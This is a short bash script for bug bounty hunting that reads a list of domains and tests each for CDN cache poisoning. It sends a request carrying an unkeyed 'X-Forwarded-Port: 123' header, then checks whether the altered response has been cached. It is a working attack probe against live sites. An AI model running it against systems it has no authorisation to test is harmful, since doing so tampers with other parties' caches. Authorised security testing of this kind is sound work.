#!/bin/bash
# author: sambal0x
# Purpose: To quickly check for potential CDN cache poisoning issues for a list of URLs
#          This just assumes that the unkeyed header is X-Forwarded-Port, but its just to check for low hanging fruits
#          Disclaimer : Use at your own risk!
#          Reference: https://hackerone.com/reports/409370
#################################################

TIMEOUT=5 # seconds

for domain in $(cat $1); do 
	baseline=$(curl -m 4 -s -o /dev/null -w "%{http_code}" https://$domain?baseline=1)  # baseline
	s1=$(curl -m 4 -k -s -o /dev/null -w "%{http_code}" -H 'X-Forwarded-Port: 123' https://$domain?dontpoisoneveryone=1) # send poison req
	s2=$(curl -m 4 -k -s -o /dev/null -w "%{http_code}" https://$domain?dontpoisoneveryone=1) # check poison req
	echo "https://$domain, $baseline,$s1, $s2"

	if [ "$baseline" != "$s1" ] && [ "$s1" == "$s2" ]; then   # if baseline and poison request not same, and poison request is confirmed -> potentiall vulnerable
		echo "[+] https://$domain is Potentially Vulnerable"
	fi
done
